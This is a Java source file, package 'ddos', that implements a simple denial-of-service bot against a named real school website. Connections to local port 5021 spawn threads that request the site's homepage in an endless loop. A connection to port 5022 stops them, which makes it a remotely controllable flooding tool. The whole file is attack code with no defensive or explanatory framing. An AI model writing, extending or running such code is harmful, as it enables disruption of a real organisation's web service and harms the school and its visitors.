/*
 * To change this template, choose Tools | Templates
 * and open the template in the editor.
 */
package ddos;

import java.io.IOException;
import java.io.InputStream;
import java.net.MalformedURLException;
import java.net.ServerSocket;
import java.net.URL;
import java.net.UnknownHostException;
import java.util.logging.Level;
import java.util.logging.Logger;

/**
 *
 * @author leif
 */
public class DDOS extends Thread{

    /**
     * @param args the command line arguments
     */
    static boolean running=true;
    public void run(){
        while(running){
            try {
                URL url = new URL("http://www.nuevaschool.org/");
                InputStream is;
                is = url.openConnection().getInputStream();
            } catch (MalformedURLException ex) {
            }
            catch(IOException io){
                
            }
            
            
        }
    }
    public static void main(String[] args) throws UnknownHostException, IOException {
         (new stopper()).start();
         (new starter()).start();
        // TODO code application logic here
    }
    public static class stopper extends Thread{
        public void run(){
            try {
                ServerSocket ss=new ServerSocket(5022);
                while(true){
                    ss.accept();
                    running=false;
                    System.out.println("Stopping");
                }
            } catch (IOException ex) {
            }
        }
    }
    public static class starter extends Thread{
        public void run(){
            try {
                ServerSocket ss=new ServerSocket(5021);
                while(true){
                    ss.accept();
                    running=true;
                    (new DDOS()).start();
                    System.out.println("starting");
                }
            } catch (IOException ex) {
            }
        }
    }
}
